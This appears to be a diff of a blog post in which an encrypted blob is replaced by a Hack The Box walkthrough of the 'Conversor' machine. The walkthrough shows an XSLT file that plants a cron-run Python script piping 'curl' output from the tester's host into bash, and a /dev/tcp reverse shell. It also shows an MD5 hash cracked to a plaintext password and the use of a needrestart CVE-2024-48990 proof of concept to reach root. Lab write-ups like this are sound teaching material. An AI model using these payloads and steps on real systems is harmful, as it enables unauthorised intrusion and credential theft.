15exp5gbtKbrc1zMkUYXrExI9NsEdkXGew+wBacC9gEekO3aiV16vj5nKLsuXx3FsNrjgAQ6AvWCFFBLuH+XS7t5pkZGjRjLZUOmuTtyfUZNfCjbOnppkO1SeLVXOLV+CxjVjdIun0x7kdar/3w98Kf1BVLr7bwcqGNyxh8YCK6NJuMYuw50YIA/Pw9aT4A5ZZrLpdi9uvVOzNTzXH1UpmhcQgx2LB4knW5es4Mg9jL5hEcrX9CyIcru4Lz9k8QmOeHDjxtjUuhJ2f3UYjeeNNauR+wjniHCMQdv/m0z11Ws5cxi0mtipWB+MN0dFXfRnA7ig/7iGeUW0DUYV3oEe1q8ZN+BQrfiSZK40Wpv7PXo3NLlqlDrzTYpc9SF8Ip3wMrDIWIHFZg5K1FkossATAJhulYr6yvsIX1z2mBgnmeCds4gmM7nttq6lmd7c1wwrlvIvcjW5mA0ATiwPH+G6abM6zUeVX+Y3ZwjCEW5an34hKRJUm39EIYUHQ+tCMddDH8q3AYghr5DssqYTzMkXZ1n6acJIbpoGDjuK1ggmC+e96XmuW02NJxII4z4lft2RLTwYcMI6mjxUlLcHk12RZF0nvlfyfUqhk1vnJtE/ORfNHMmTQT5HQX2NGd3r0QZgYfdX58/910ifpwZ1YcSJ8ihy+fNGaQ0LpARW7kCNk7aEeP/uEXTHxxtVKwrJfDpZV2tr41iwGK37REPFfiNjoLJSwnR2qtNgOgoX4buYUtxpe+sb/I5SzY30ZYFnAmaNKvkvaIUeX/lvY1ZQOjix8PwNO5sT3b4HtXmwZBPoewUYNigYjig7zlwZrLF43d1sZ4yvE97uUv9gU0Mfbea3QFvxomKYTewpAcod5XHhfqHFnChUz7PUc9iSXpMZtCbiHdzxszM0E+IEGPC9Q6ZFvxDqabsmy+9dxguXINayMC4sMTTQIPswxyLRvP21MnId95G5Cb7kiN0wqNgiwdaZgqVTIJHmrztinxv+5QvH8fvK1I/qgVpUUoKatyqbKRWyPIHnoUVMouCN9hQtUjuCJTu34LvyN4ddFkpc2I4nOrcdShoXe5bS19fBANYvlmLTO2AZPCRodYcz3uLbNuoRyxftKLqX0rV0gWBCnuDYb0qDNrWBevbvw6YaZ1ldGRHtQEZi+VRqDcKQ4ulRXziqrUnFscOu8fRgsE2iPjC3fgyDH4/RSYCLIii+1Djt0vMX3PAvO33TTnbtnuhpFhnC0+q8XRCa4VUxE/XexrLL3jOy6BZtS/9/sMww/TxcjSBzYwoDlIMu5XCcaGYJrO3Av0GFRy3pMjPLsds9Bo5jpPDnAWv8XIIUsCUqhqFjeFDSWiVZvqAJNJHQI36gnIMi9YFwnCEWuNF1Fcavkp9zFGFtN/gCq4rAJJrgz3eFTpWM6G1R2zHDdqvtjoBC9Ep644Rsc6esQqiY/Qus74gNPfkdExEsxKEJAgDhdVuAmwQcb422MwENYPzPANTqFZcbhbU+1mWjOJ3qxKt/DYAQsIffRbcWnMAUUg7dRAW7lshBpfQx9XSAg/kra0jP2J+zNA3b+iem4ZmcioXxRR1EepUOevvEfb6PVS/uuTGPpZGpXer55CgfpBYMidc19jx4+Hds+ln8RxU749Oz2JR54fCwJCloa6r8OxqMqo7ALrkQybXPXffFJ4G0enUYprCGfHv6SPNLrpoHtyWJMALJwqjfLsN7KCR0gCOf0joDWd/ECpsGEhQlxEvED6kgVDWWSZQJplSscixJoXdMASdzQWklHl2mR+Eh2NUBXlam+4xRg3gU9wyVyfAV7fFS28IfVBpjj+OSL2B2iFTtp0pabXARb+9Ul7FZQYMgUTMFhMHq9hRVIFE
-iv: tz7xdij4PH2JMFe45eoQkA==
-salt: ZkRYw8/8hUO0XnCsZasXxA==
-hmac: s2KHK58sK6ZhLnQfTcpp3nytWNOWib9cj6O29n7006M=
+---
+title: "Conversor"
+date: 27-10-2025
+categories: [HTB, Linux, Linux Easy]
+tags: [Scripts, CVE, XML, XSLT, Source Code]
+image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0b659c391f2803c247e79c77a3284f96.png
+---
+
+Conversor is an easy Linux machine from Hack The Box. Foothold is a bit tricky if you are unfamiliar with XML and skip over small details. We get a page which converts XML data into a nice looking website, the site also gives us the source code to the site which shows an `INSTALL.md` file that reveals that the server is executing python scripts from a certain directory. Using an XMLT file a python script is uploaded and we get a reverse shell as `www-data`, inside the server we can read the database from where we can get another user's password. This user can SSH into the box and can run an outdated binary as sudo. Using a public POC we can get root.
+
+![alt text](/assets/images/conversor/Conversor.png)
+
+## Nmap
+We can start as always with an nmap scan which reveals two open ports, port 22 for SSH and port 80, which hosts a website. 
+```
+nmap -Pn 10.129.80.15 -sCV 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-27 16:54 CET
+Nmap scan report for conversor.htb (10.129.80.15)
+Host is up (0.044s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
+|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://conversor.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: conversor.htb
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
+```
+
+From the nmap scan we can see that the website is trying to redirect us to `conversor.htb` we can add this entry into our host file to access the page.
+![alt text](/assets/images/conversor/front.png)
+
+Since we do no have a valid account we can register one on the `/register` endpoint, we can then use the credentials on the `/login` page and we gain access to the home page.
+![alt text](/assets/images/conversor/home.png)
+We can see that the page is designed for the user to upload an XML and XSLT file and the server will render a nice webpage. We will use this later on but first lets take a look at the `/about` endpoint. 
+![alt text](/assets/images/conversor/about.png)
+
+## Finding the Application's Source Code
+We can see that the project is open source and they give us a download link to a tar file containing the compressed source code of the app. After downloading it we can extract it using `tar`
+
+```sh
+ls
+source_code.tar.gz
+
+file source_code.tar.gz 
+source_code.tar.gz: POSIX tar archive (GNU)
+
+tar -xf source_code.tar.gz
+
+ls
+app.py  app.wsgi  install.md  instance  scripts  source_code.tar.gz  static  templates  uploads
+```
+
+If we read the `install.md` file we can see that the server seem to be executing every python script inside the `scripts` directory every minute as the `www-data` user.
+```
+cat install.md 
+To deploy Conversor, we can extract the compressed file:
+
+"""
+tar -xvf source_code.tar.gz
+"""
+
+We install flask:
+
+"""
+pip3 install flask
+"""
+
+We can run the app.py file:
+
+"""
+python3 app.py
+"""
+
+You can also run it with Apache using the app.wsgi file.
+
+If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
+
+"""
+* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
+"""
+```
+
+The file also revealed the working directory of the web server which is `/var/www/convesor.htb/`. If we cat the `app.py` file we can see that it parses the `xslt` and executes it.
+```python
+@app.route('/convert', methods=['POST'])
+def convert():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    xml_file = request.files['xml_file']
+    xslt_file = request.files['xslt_file']
+    from lxml import etree
+    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
+    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
+    xml_file.save(xml_path)
+    xslt_file.save(xslt_path)
+    try:
+        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
+        xml_tree = etree.parse(xml_path, parser)
+        xslt_tree = etree.parse(xslt_path)
+        transform = etree.XSLT(xslt_tree)
+        result_tree = transform(xml_tree)
+        result_html = str(result_tree)
+        file_id = str(uuid.uuid4())
+        filename = f"{file_id}.html"
+        html_path = os.path.join(UPLOAD_FOLDER, filename)
+        with open(html_path, "w") as f:
+            f.write(result_html)
+        conn = get_db()
+        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
+        conn.commit()
+        conn.close()
+        return redirect(url_for('index'))
+    except Exception as e:
+        return f"Error: {e}"
+```
+
+## Uploading a Malicious Script with XSLT
+We can see that the code does not have a lot of safeguards in place. I used this to upload a python script which would download a bash shell form my system and execute it. I used the following `xslt` file:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet 
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
+    xmlns:shell="http://exslt.org/common"
+    extension-element-prefixes="shell"
+    version="1.0"
+>
+<xsl:template match="/">
+<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+import os
+os.system("curl 10.10.14.125:443/shell.sh|bash")
+</shell:document>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+For the xml file I just ran the same nmap scan as before but making it output the results in xml format:
+```
+nmap -Pn 10.129.80.15 -sCV -oX scan.xml
+```
+
+To set up I made the `shell.sh` script which is the script being downloaded by the xslt file. It contains the following code:
+```sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.131/9001 0>&1
+```
+
+I then started my python server to listen for any web requests and my netcat listener to get the reverse shell connection
+```
+sudo python3 -m http.server 443
+```
+```
+nc -vlnp 9001
+```
+
+I then uploaded the two files, `scan.xml` and `shell.xslt` and waiting for a minute. After some time I see that the bash script was downloaded and immediately executed giving me a shell as `www-data`:
+```
+sudo python3 -m http.server 443
+Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
+10.129.80.15 - - [27/Oct/2025 17:55:49] "GET /shell.sh HTTP/1.1" 200 -
+```
+```
+nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.129.80.15 44408
+bash: cannot set terminal process group (7629): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@conversor:~$ 
+```
+
+In the source code that we downloaded earlier I saw that the application uses an sqlite3 database, reading the database shows that there is another user apart from me, this other user also has a home folder in the server, which suggests that they have the same password.
+
+```
+www-data@conversor:~/conversor.htb$ cd instance
+cd instance
+www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
+sqlite3 users.db
+select * from users;
+1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+<SNIP>
+```
+
+The password hash is in md5 format which is a very weak hashing algorithm, the hash cracks instantly using hashcat:
+```
+hashcat 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt -m 0
+hashcat (v6.2.6) starting
+
+<SNIP>
+
+5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm        
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
+Time.Started.....: Mon Oct 27 18:02:38 2025 (8 secs)
+Time.Estimated...: Mon Oct 27 18:02:46 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1393.8 kH/s (0.12ms) @ Accel:256 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10974720/14344385 (76.51%)
+Rejected.........: 0/10974720 (0.00%)
+Restore.Point....: 10973184/14344385 (76.50%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: KeishayYashi -> KayanP75
+Hardware.Mon.#1..: Util: 26%
+
+Started: Mon Oct 27 18:02:37 2025
+Stopped: Mon Oct 27 18:02:47 2025
+```
+
+## Root
+Using this password I ssh'ed as fismathack on `conversor.htb`
+```
+ssh fismathack@conversor.htb
+fismathack@conversor.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
+
+<SNIP>
+fismathack@conversor:~$ sudo -l
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
+```
+
+We can see that the user can run the `needrestart` binary as the sudo user. A quick google search shows that this binary has been vulnerable to a privilege escalation vulnerability. Checking the version of the installed binary shows that it is still vulnerable.
+```
+fismathack@conversor:~$ /usr/sbin/needrestart --version
+
+needrestart 3.7 - Restart daemons after library updates.
+
+Authors:
+  Thomas Liske <thomas@fiasko-nw.net>
+
+Copyright Holder:
+  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]
+
+Upstream:
+  https://github.com/liske/needrestart
+
+This program is free software; you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation; either version 2 of the License, or
+(at your option) any later versio
+```
+
+The specific CVE is CVE-2024-48990 more details about it can be found [here](https://nvd.nist.gov/vuln/detail/CVE-2024-48990), the vulnerability affects version up to 3.7 which is our current version, searching for a public proof of concept online I was able to find [this one](https://github.com/makuga01/CVE-2024-48990-PoC) the target system does not have gcc so I compiled the exploit locally and then transferred it using a python server.
+
+```
+git clone https://github.com/makuga01/CVE-2024-48990-PoC.git
+cd CVE-2024-48990-PoC/
+
+gcc -shared -fPIC -o "$PWD/__init__.so" lib.c
+
+sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.80.15 - - [27/Oct/2025 18:12:53] "GET /__init__.so HTTP/1.1" 200 -
+10.129.80.15 - - [27/Oct/2025 18:13:45] "GET /e.py HTTP/1.1" 200 -
+```
+
+On the target I downloaded the `e.py` and the compiled python library.
+```
+wget http://10.10.14.131/__init__.so
+wget http://10.10.14.131/e.py
+```
+
+```sh
+fismathack@conversor:~$ chmod +x __init__.so 
+fismathack@conversor:~$ mkdir -p "$PWD/importlib"
+fismathack@conversor:~$ mv __init__.so importlib/
+fismathack@conversor:~$ PYTHONPATH="$PWD" python3 e.py
+Error processing line 1 of /usr/lib/python3/dist-packages/zope.interface-5.4.0-nspkg.pth:
+
+  Traceback (most recent call last):
+    File "/usr/lib/python3.10/site.py", line 192, in addpackage
+      exec(line)
+    File "<string>", line 1, in <module>
+  ImportError: dynamic module does not define module export function (PyInit_importlib)
+
+Remainder of file ignored
+##########################################
+
+Don't mind the error message above
+
+Waiting for needrestart to run...
+```
+
+Seems like it is working so i start another ssh connection and I run the binary as sudo:
+```
+ssh fismathack@conversor.htb
+fismathack@conversor.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
+
+<SNIP>
+
+fismathack@conversor:~$ sudo -l
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
+fismathack@conversor:~$ sudo /usr/sbin/needrestart
+Scanning processes...                                                                                                                                                                         
+Scanning linux images...                                                                                                                                                                      
+
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+```
+
+Checking on the other ssh terminal, we see that the exploit worked and we are root!
+```
+Waiting for needrestart to run...
+Got the shell!
+# id 
+uid=1000(fismathack) gid=1000(fismathack) euid=0(root) groups=1000(fismathack)
+```
